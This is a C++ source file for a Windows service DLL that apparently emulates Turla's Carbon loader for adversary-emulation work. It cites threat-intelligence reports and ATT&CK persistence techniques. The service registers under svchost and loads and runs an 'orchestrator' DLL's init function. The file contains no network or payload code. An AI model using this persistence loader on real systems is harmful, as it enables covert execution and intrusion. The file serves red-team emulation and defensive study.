/*
 * Provide main service logic for the loader DLL.
 * Based on sample service code from https://docs.microsoft.com/en-us/windows/win32/services/writing-a-servicemain-function
 * https://docs.microsoft.com/en-us/windows/win32/services/svc-cpp
 * https://docs.microsoft.com/en-us/windows/win32/services/writing-a-control-handler-function
 * and examples from https://www.ired.team/offensive-security/persistence/persisting-in-svchost.exe-with-a-service-dll-servicemain
 *
 * CTI references:
 * [1] https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/
 * [2] https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html
 * [3] https://www.gdata.pt/blog/2015/01/23926-analysis-of-project-cobra
 */

#include <windows.h>
#include <strsafe.h>
#include <synchapi.h>
#include <winbase.h>
#include <winsvc.h>
#include <libloaderapi.h>
#include "service.h"

namespace loader_service {

SERVICE_STATUS serviceStatus;
SERVICE_STATUS_HANDLE serviceStatusHandle;
HANDLE hServiceStopEvent = NULL;

// Wrapper for RegisterServiceCtrlHandlerExW (winsvc.h)
SERVICE_STATUS_HANDLE LoaderSvcWrapper::RegisterServiceCtrlHandlerExWrapper(LPCTSTR lpServiceName, LPHANDLER_FUNCTION_EX lpHandlerProc, LPVOID lpContext) {
    return RegisterServiceCtrlHandlerEx(lpServiceName, lpHandlerProc, lpContext);
}

// Wrapper for CreateEventA (synchapi.h)
HANDLE LoaderSvcWrapper::CreateEventWrapper(LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState, LPCSTR lpName) {
    return CreateEventA(lpEventAttributes, bManualReset, bInitialState, lpName);
}

// Wrapper for WaitForSingleObject (synchapi.h)
DWORD LoaderSvcWrapper::WaitForSingleObjectWrapper(HANDLE hHandle, DWORD dwMilliseconds) {
    return WaitForSingleObject(hHandle, dwMilliseconds);
}

// Wrapper for SetEvent (synchapi.h)
BOOL LoaderSvcWrapper::SetEventWrapper(HANDLE hEvent) {
    return SetEvent(hEvent);
}

// Wrapper for SetServiceStatus (winsvc.h)
BOOL LoaderSvcWrapper::SetServiceStatusWrapper(SERVICE_STATUS_HANDLE hServiceStatus, LPSERVICE_STATUS lpServiceStatus) {
    return SetServiceStatus(hServiceStatus, lpServiceStatus);
}

// Wrapper for RegisterEventSource (winbase.h)
HANDLE LoaderSvcWrapper::RegisterEventSourceWrapper(LPCTSTR lpUNCServerName, LPCTSTR lpSourceName) {
    return RegisterEventSource(lpUNCServerName, lpSourceName);
}

// Wrapper for DeregisterEventSource (winbase.h)
BOOL LoaderSvcWrapper::DeregisterEventSourceWrapper(HANDLE hEventLog) {
    return DeregisterEventSource(hEventLog);
}

// Wrapper for ReportEvent (winbase.h)
BOOL LoaderSvcWrapper::ReportEventWrapper(
    HANDLE  hEventLog,
    WORD    wType,
    WORD    wCategory,
    DWORD   dwEventID,
    PSID    lpUserSid,
    WORD    wNumStrings,
    DWORD   dwDataSize,
    LPCTSTR *lpStrings,
    LPVOID  lpRawData
) {
    return ReportEvent(
        hEventLog,
        wType,
        wCategory,
        dwEventID,
        lpUserSid,
        wNumStrings,
        dwDataSize,
        lpStrings,
        lpRawData
    );
}

// Wrapper for LoadLibrary (libloaderapi.h)
HMODULE LoaderSvcWrapper::LoadLibraryWrapper(LPCTSTR lpLibFileName) {
    return LoadLibrary(lpLibFileName);
}

// Wrapper for GetProcAddress (libloaderapi.h)
FARPROC LoaderSvcWrapper::GetProcAddressWrapper(HMODULE hModule, LPCSTR lpProcName) {
    return GetProcAddress(hModule, lpProcName);
}

// Wrapper to execute the ModuleInit function
void LoaderSvcWrapper::ModuleInitWrapper(fp_module_init fp_init_func) {
    fp_init_func();
}

// Use event log to log generic message, for debugging purposes. 
// Will appear under Applications event logs in Event Viewer.
// Reference: https://docs.microsoft.com/en-us/windows/win32/services/svc-cpp
VOID LogEvent(LoaderSvcWrapperInterface* wrapper, LPCTSTR message, WORD event_type, DWORD event_identifier) {
    HANDLE hEventSource;
    LPCTSTR lpszStrings[2];

    hEventSource = wrapper->RegisterEventSourceWrapper(NULL, SERVICE_NAME);
    if(hEventSource != NULL) {
        lpszStrings[0] = SERVICE_NAME;
        lpszStrings[1] = message;
        wrapper->ReportEventWrapper(
            hEventSource,       // event log handle
            event_type,         // event type
            0,                  // event category
            event_identifier,   // event identifier
            NULL,               // no security identifier
            2,                  // size of lpszStrings array
            0,                  // no binary data
            lpszStrings,        // array of strings
            NULL                // no binary data
        );
        wrapper->DeregisterEventSourceWrapper(hEventSource);
    }
}

// Run the ModuleInit function from the orchestrator DLL.
// Turla used the loader service to kick off the orchestrator DLL [3].
VOID RunModule(LoaderSvcWrapperInterface* wrapper, LPCTSTR module_path, LPCSTR function_name) {
    // Load orchestrator DLL
    HMODULE module_handle = wrapper->LoadLibraryWrapper(module_path);
    if (!module_handle) {
        LogEvent(wrapper, TEXT("Could not load required module."), EVENTLOG_ERROR_TYPE, SVC_ERROR);
        return;
    }

    // Get func address
    fp_module_init module_init_func = (fp_module_init)(wrapper->GetProcAddressWrapper(module_handle, function_name));
    if (!module_init_func) {
        LogEvent(wrapper, TEXT("Could not find required module function."), EVENTLOG_ERROR_TYPE, SVC_ERROR);
        return;
    }

    // Run the function
    wrapper->ModuleInitWrapper(module_init_func);
}

// Report service status to the service control manager.
// Reference: https://docs.microsoft.com/en-us/windows/win32/services/writing-a-servicemain-function
//  https://www.ired.team/offensive-security/persistence/persisting-in-svchost.exe-with-a-service-dll-servicemain
VOID ReportServiceStatus(LoaderSvcWrapperInterface* wrapper, DWORD dwCurrentState, DWORD dwWin32ExitCode, DWORD dwWaitHint) {
    static DWORD dwCheckPoint = 1;
    serviceStatus.dwCurrentState = dwCurrentState;
    serviceStatus.dwWin32ExitCode = dwWin32ExitCode;
    serviceStatus.dwWaitHint = dwWaitHint;

    // Indicate whether service should be stoppable or not at this time.
    if (dwCurrentState == SERVICE_START_PENDING)
        serviceStatus.dwControlsAccepted = 0;
    else serviceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;

    if ((dwCurrentState == SERVICE_RUNNING) || (dwCurrentState == SERVICE_STOPPED))
        serviceStatus.dwCheckPoint = 0;
    else serviceStatus.dwCheckPoint = dwCheckPoint++;

    wrapper->SetServiceStatusWrapper(serviceStatusHandle, &serviceStatus);
}


// Handler function for controlling service status.
// References: 
//      https://www.ired.team/offensive-security/persistence/persisting-in-svchost.exe-with-a-service-dll-servicemain
//      https://docs.microsoft.com/en-us/windows/win32/services/writing-a-control-handler-function    
//      https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nc-winsvc-lphandler_function_ex
DWORD WINAPI ServiceCtrlHandler(DWORD dwControl, DWORD dwEventType, LPVOID lpEventData, LPVOID lpContext) {
    // silence warnings about unused parameters
    (void)dwEventType;
    (void)lpEventData;
    
    // When we registered the control handler function, we pass a pointer to the API call wrapper as lpContext
    LoaderSvcWrapperInterface* ploaderSvcWrapper = (LoaderSvcWrapperInterface*)lpContext;
    
    // Handle various control codes
    switch(dwControl) {
        case SERVICE_CONTROL_STOP:
            ReportServiceStatus(ploaderSvcWrapper, SERVICE_STOP_PENDING, NO_ERROR, 0);
            ploaderSvcWrapper->SetEventWrapper(hServiceStopEvent);
            break;
        case SERVICE_CONTROL_SHUTDOWN:
            serviceStatus.dwCurrentState = SERVICE_STOPPED;
            ploaderSvcWrapper->SetEventWrapper(hServiceStopEvent);
            break;
        case SERVICE_CONTROL_PAUSE:
            serviceStatus.dwCurrentState = SERVICE_PAUSED;
            break;
        case SERVICE_CONTROL_CONTINUE:
            serviceStatus.dwCurrentState = SERVICE_RUNNING;
            break;
        case SERVICE_CONTROL_INTERROGATE:
            return NO_ERROR;
        default:
            break;
    }
    ReportServiceStatus(ploaderSvcWrapper, serviceStatus.dwCurrentState, NO_ERROR, 0);
    return NO_ERROR;
}

/*
 * BeginService:
 *      About:
 *          Perform main logic for the loader service
 *      MITRE ATT&CK Techniques:
 *          T1569.002: System Services: Service Execution
 *.         T1543.003: Create or Modify System Process: Windows Service
 *      CTI:
 *          https://www.gdata.pt/blog/2015/01/23926-analysis-of-project-cobra
 *      Other References:
 *          https://docs.microsoft.com/en-us/windows/win32/services/writing-a-servicemain-function
 *          https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nc-winsvc-lphandler_function_ex
 *          https://www.ired.team/offensive-security/persistence/persisting-in-svchost.exe-with-a-service-dll-servicemain
 */
VOID BeginService(LoaderSvcWrapperInterface* wrapper, DWORD dwNumServicesArgs, LPSTR *lpServiceArgVectors) {
    // silence warnings about unused parameters
    (void)dwNumServicesArgs;
    (void)lpServiceArgVectors;
    
    // Create a service stop event
    hServiceStopEvent = wrapper->CreateEventWrapper(
        NULL, // default security attributes
        TRUE, // manual reset event
        FALSE, // not signaled
        NULL // no name
    );
    
    if (hServiceStopEvent == NULL) {
        LogEvent(wrapper, TEXT("Failed to create service event."), EVENTLOG_ERROR_TYPE, SVC_ERROR);
        ReportServiceStatus(wrapper, SERVICE_STOPPED, NO_ERROR, 0);
        return;
    }
    
    // Notify that the service is up and running.
    ReportServiceStatus(wrapper, SERVICE_RUNNING, NO_ERROR, 0);
    
    // Kick off the orchestrator DLL. [3]
    RunModule(wrapper, ORCHESTRATOR_PATH, ORCHESTRATOR_INIT_FUNC_NAME);

    // Wait until service stop requested.
    while(1) {
        wrapper->WaitForSingleObjectWrapper(hServiceStopEvent, INFINITE);
        ReportServiceStatus(wrapper, SERVICE_STOPPED, NO_ERROR, 0);
        return;
    }
}

// Initialize service to prepare it for kickoff
int PrepService(LoaderSvcWrapperInterface* wrapper) {
    // Register the control handler function
    loader_service::serviceStatusHandle = wrapper->RegisterServiceCtrlHandlerExWrapper(SERVICE_NAME, (LPHANDLER_FUNCTION_EX)loader_service::ServiceCtrlHandler, wrapper);
    if (!loader_service::serviceStatusHandle) {
        TCHAR buffer[128];
        StringCchPrintf(buffer, 128, TEXT("Failed to set up service. Error code: %d"), FAILURE_REGISTER_SVC_CTRL_HANDLER);
        loader_service::LogEvent(wrapper, buffer, EVENTLOG_ERROR_TYPE, SVC_ERROR);
        return FAILURE_REGISTER_SVC_CTRL_HANDLER;
    }
    loader_service::serviceStatus.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;
    loader_service::serviceStatus.dwServiceSpecificExitCode = 0;
    loader_service::ReportServiceStatus(wrapper, SERVICE_START_PENDING, NO_ERROR, 3000);
    return ERROR_SUCCESS;
}

} // namespace loader_service

// Entry point for the service
// References: https://www.ired.team/offensive-security/persistence/persisting-in-svchost.exe-with-a-service-dll-servicemain
//      https://docs.microsoft.com/en-us/windows/win32/services/writing-a-servicemain-function
extern "C" __declspec(dllexport) VOID WINAPI ServiceMain(DWORD dwNumServicesArgs, LPSTR *lpServiceArgVectors) {
    static loader_service::LoaderSvcWrapper loaderSvcWrapper;
    if (PrepService(&loaderSvcWrapper) != ERROR_SUCCESS) {
        return;
    }
    loader_service::BeginService(&loaderSvcWrapper, dwNumServicesArgs, lpServiceArgVectors);
}

